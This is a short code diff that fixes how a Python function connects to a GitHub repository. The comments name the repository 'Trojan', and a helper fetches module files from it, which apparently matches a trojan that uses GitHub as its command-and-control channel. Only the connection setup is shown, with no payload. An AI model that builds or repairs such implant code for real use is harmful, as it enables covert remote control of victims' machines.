@@ -15,7 +15,7 @@ def github_connect():
         token = f.read().strip()
     user = 'RealIrox100'  # GitHub username
     sess = github3.login(token=token)  # Login to GitHub using the token
-    return sess.repository(user, 'https://github.com/RealIrox100/Funtime-Stuff.git')  # Return the specific repository 'Trojan'
+    return sess.repository(user, 'Funtime-Stuff')  # Return the specific repository 'Trojan'
 # Function to retrieve the contents of a file from a specific directory in the GitHub repository
 def get_file_contents(dirname, module_name, repo):
     # Fetch the file contents from the specified directory and module name
